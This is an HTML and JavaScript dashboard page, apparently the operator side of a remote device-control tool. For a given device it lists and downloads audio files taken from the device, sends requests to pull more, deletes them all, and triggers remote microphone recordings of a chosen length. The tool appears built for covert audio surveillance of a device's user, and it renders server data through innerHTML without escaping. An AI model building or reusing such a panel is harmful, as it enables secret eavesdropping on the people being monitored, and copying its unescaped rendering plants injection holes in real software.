<!DOCTYPE html>
<html lang="en">

<head>

    <meta charset="UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Device Audios</title>

    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/css/bootstrap.min.css" rel="stylesheet">

</head>

<body class="bg-light">

    <div class="container mt-4">

        <div class="mb-3">

            <!-- Desktop -->
            <div class="d-none d-md-block">

                <!-- Row 1 -->
                <div class="d-flex justify-content-between align-items-center mb-2">

                    <h3 class="mb-0">
                        🎵 Device Audios
                    </h3>

                    <div class="d-flex gap-2">

                        <button class="btn btn-warning btn-sm" onclick="getAudios()">
                            Get Audio
                        </button>

                        <button class="btn btn-success btn-sm" onclick="allowMic()">
                            Get Mic
                        </button>

                        <button class="btn btn-danger btn-sm" onclick="deleteAllAudios()">
                            Delete All
                        </button>

                        <a href="/dashboard.html" class="btn btn-secondary btn-sm">
                            Back
                        </a>

                    </div>

                </div>

                <!-- Row 2 -->
                <small id="totalCount" class="text-muted">
                    Total Audios : 0
                </small>

            </div>

            <!-- Mobile -->
            <div class="d-md-none">

                <!-- Row 1 -->
                <div class="d-flex justify-content-between align-items-center mb-2">

                    <h4 class="mb-0">
                        🎵 Device Audios
                    </h4>

                    <div class="d-flex gap-2">

                        <button class="btn btn-danger btn-sm px-3" onclick="deleteAllAudios()">
                            Delete
                        </button>

                        <a href="/dashboard.html" class="btn btn-secondary btn-sm px-4">
                            Back
                        </a>

                    </div>



                </div>

                <!-- Row 2 -->
                <div class="d-flex justify-content-between align-items-center">

                    <small id="totalCountMobile" class="text-muted">
                        Total Audios : 0
                    </small>

                    <div class="d-flex gap-2">

                        <button class="btn btn-warning btn-sm px-4" onclick="getAudios()">
                            Get Audio
                        </button>

                        <button class="btn btn-success btn-sm px-4" onclick="allowMic()">
                            Get Mic
                        </button>

                    </div>

                </div>

            </div>

        </div>

        <div class="row" id="audioGrid"></div>

        <div class="d-flex justify-content-center mt-4">

            <nav>

                <ul class="pagination" id="pagination"></ul>

            </nav>

        </div>

    </div>

    <script>

        const params = new URLSearchParams(window.location.search);

        const deviceId = params.get("deviceId");

        let audios = [];

        let currentPage = 1;

        const pageSize = 12;

        loadAudios();

        async function loadAudios() {

            const response = await fetch("/media/audio/" + deviceId);

            const result = await response.json();

            console.log(result);

            audios = result.data || [];

            document.getElementById("totalCount").innerHTML =
                "Total Audios : " + audios.length;

            renderPage();

        }

        function renderPage() {

            let html = "";

            const start = (currentPage - 1) * pageSize;

            const end = start + pageSize;

            audios.slice(start, end).forEach(audio => {

                html += `

                <div class="col-md-4 mb-4">

                    <div class="card shadow-sm">

                        <div class="card-body">

                            <h6 class="text-truncate">

                                ${audio.audioName}

                            </h6>

                            <audio controls class="w-100">

                                <source src="${audio.audioUrl}">

                            </audio>

                            <div class="mt-2">

                                <small class="text-muted">

                                    ${formatSize(audio.audioSize)}

                                </small>

                            </div>

                            <a href="${audio.audioUrl}"

                               class="btn btn-primary btn-sm mt-2"

                               download>

                                Download

                            </a>

                        </div>

                    </div>

                </div>

                `;

            });

            if (audios.length === 0) {

                html = `

                <div class="col-12">

                    <div class="alert alert-warning text-center">

                        No Audio Found

                    </div>

                </div>

                `;

            }

            document.getElementById("audioGrid").innerHTML = html;

            renderPagination();

        }

        function renderPagination() {

            let html = "";

            const totalPages = Math.ceil(audios.length / pageSize);

            for (let i = 1; i <= totalPages; i++) {

                html += `

                <li class="page-item ${i === currentPage ? 'active' : ''}">

                    <button class="page-link"

                            onclick="gotoPage(${i})">

                        ${i}

                    </button>

                </li>

                `;

            }

            document.getElementById("pagination").innerHTML = html;

        }

        function gotoPage(page) {

            currentPage = page;

            renderPage();

        }

        async function deleteAllAudios() {

            if (!confirm("Delete all audios ?")) {

                return;

            }

            const response = await fetch(

                "/media/audio/" + deviceId,

                {

                    method: "DELETE"

                }

            );

            if (response.ok) {

                alert("Audios Deleted Successfully");

                loadAudios();

            }

            else {

                alert("Delete Failed");

            }

        }

        function formatSize(bytes) {

            if (!bytes) return "0 B";

            if (bytes < 1024) return bytes + " B";

            if (bytes < 1024 * 1024)
                return (bytes / 1024).toFixed(2) + " KB";

            if (bytes < 1024 * 1024 * 1024)
                return (bytes / 1024 / 1024).toFixed(2) + " MB";

            return (bytes / 1024 / 1024 / 1024).toFixed(2) + " GB";

        }

        async function getAudios() {

            if (!deviceId) {

                alert("Device Not Found");

                return;

            }

            if (!confirm("Fetch audios from this device?")) {

                return;

            }

            const response = await fetch(

                "/media/audio/request/" + deviceId,

                {

                    method: "POST"

                }

            );

            const text = await response.text();

            alert(text);

        }

        async function allowMic() {

            if (!deviceId) {

                alert("Device Not Found");

                return;

            }

            let duration = prompt(

                "Recording Duration (Seconds)",

                "30"

            );

            if (!duration) {

                return;

            }

            await fetch("/media/mic/request", {

                method: "POST",

                headers: {

                    "Content-Type": "application/json"

                },

                body: JSON.stringify({

                    deviceId: deviceId,

                    duration: parseInt(duration)

                })

            });

            alert("Mic Recording Request Sent");

        }

    </script>

</body>

</html>
